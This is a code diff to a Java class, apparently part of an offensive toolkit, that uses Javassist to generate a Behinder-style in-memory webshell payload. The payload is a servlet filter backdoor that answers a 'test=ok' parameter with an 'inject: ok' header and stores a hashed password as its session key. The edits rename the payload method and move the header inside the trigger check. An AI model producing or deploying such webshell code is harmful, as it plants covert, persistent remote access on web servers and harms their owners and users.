@@ -14,15 +14,8 @@ import javax.servlet.jsp.PageContext;
 public class Behinder1 {
 
 
-    /**
-     * 此处用的是filter马，后面可以换成Listener马更香
-     * Safe6 2021.8.2
-     * @param pass
-     * @return
-     * @throws Exception
-     */
 
-    public static byte[] getMemBehinder3(String pass) throws Exception {
+    public static byte[] getMemBehinder3Payload(String pass) throws Exception {
         //String pass = "rebeyond";
 
         ClassPool classPool = ClassPool.getDefault();
@@ -72,8 +65,8 @@ public class Behinder1 {
                 "        javax.servlet.http.HttpServletResponse response =request.getResponse();\n" +
                 "        javax.servlet.http.HttpSession session = request.getSession();\n" +
                 "\n" +
-                "            response.setHeader(\"inject\", \"ok\");\n" +
                 "        if (request.getParameter(\"test\").equals(\"ok\")) {\n" +
+                "            response.setHeader(\"inject\", \"ok\");\n" +
                 "            String k = md5(passwd);\n" +
                 "            session.putValue(\"u\", k);\n" +
                 "            // 回显密钥\n" +
